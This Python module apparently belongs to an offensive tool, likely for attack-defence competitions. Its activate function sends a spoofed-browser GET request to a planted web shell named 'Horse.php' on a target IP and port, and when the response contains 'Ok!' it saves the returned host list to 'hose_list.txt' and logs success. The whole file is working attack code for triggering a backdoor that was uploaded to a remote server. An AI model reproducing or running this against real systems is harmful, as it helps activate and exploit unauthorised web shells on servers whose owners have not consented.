import requests
import os
from libs.Misc import Config
from libs.Misc import Log


def activate(ip, port, upload_horse_path):
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        horse_url = "http://{}:{}/{}/Horse.php".format(ip, port, upload_horse_path)
        res = requests.get(horse_url, headers=header, timeout=2, proxies=Config.proxy)
        if res.status_code == 200 and 'Ok!' in res.content.decode():
            with open(os.path.dirname(__file__)+'/hose_list.txt', 'w', encoding='utf-8')as f:
                f.write(res.content.decode().replace('<br>', '\n'))
            Log.green("Active Ok")
    except requests.Timeout:
        Log.red("Active Failed")
